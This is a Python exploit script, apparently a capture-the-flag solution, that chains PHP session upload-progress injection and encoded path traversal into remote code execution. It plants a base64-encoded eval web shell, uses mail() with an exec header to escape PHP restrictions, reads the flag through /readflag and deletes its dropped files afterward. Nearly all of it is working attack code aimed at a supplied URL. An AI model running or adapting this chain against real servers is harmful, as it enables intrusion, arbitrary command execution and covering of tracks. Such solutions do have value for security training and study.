import requests
import sys
import base64


if (len(sys.argv)==2):
	url=sys.argv[1]
else:
    print("Usage: "+str(sys.argv[0])+" http://url:port")
    exit()

def str_to_B64(data):
    b64 = base64.b64encode(data.encode('ascii'))
    return b64

php_file = "exploit.php"
session = "session-injection"
tmp_dir = "../../../../tmp/".replace("/", "%2f").replace(".", "%2e").replace("%", "%25")

encoded_code = str_to_B64("<?php eval(urldecode($_GET['command']))?>")
cookies = {"PHPSESSID" : session}
payload = {
    "PHP_SESSION_UPLOAD_PROGRESS":
        """<?php
        $file = '/www/{}';
        $handle = fopen($file, 'w');
        fwrite($handle,base64_decode('{}'));
        fclose($handle);
        ?>
        """.format(php_file,encoded_code)
}

file = {"file": ('file.txt','slow' * 250000)}

requests.post(url + "/info", cookies = cookies, data = payload, files = file, proxies={"http": "127.0.0.1:8080"})

r = requests.get(url + "/miner/" + tmp_dir + "sess_" + session, proxies={"http": "127.0.0.1:8080"})

if "Warning" in r.text:
    sys.exit("- This doesn't work")
    
print("+ Sucessful RCE" + "\n") 

##Second part CE to RCE
## hack.php

bash_file = "getflag"
b64data = str_to_B64("<?php mail('', '', '', '', '-H \"exec /www/{}\"'); ?>".format(bash_file))
command = """
    $file = '/www/hack.php; 
    $handle = fopen($file, 'w'); 
    fwrite($handle,base64_decode('%s')); 
    fclose($handle);

    """ % (b64data)

requests.get(url + '/{}?command='.format(php_file) + command, proxies={"http": "127.0.0.1:8080"})

## getflag

code = """
        /readflag > /www/flag.txt 
        rm -r /www/hack.php 
        rm -r /www/{}
        """.format(bash_file)

b64data = str_to_B64(code)
command = """
    $file = '/www/{}; 
    $handle = fopen($file, 'w'); 
    fwrite($handle,base64_decode('{}')); 
    fclose($handle);
    chmod('/www/{}',0777);
    """.format(bash_file,b64data,bash_file)
    
requests.get(url + '/{}?command='.format(php_file) + command, proxies={"http": "127.0.0.1:8080"})
requests.get(url + "/hack.php", proxies={"http": "127.0.0.1:8080"})

r = requests.get(url + "/flag.txt", proxies={"http": "127.0.0.1:8080"})
print("+ Flag:" + r.text)
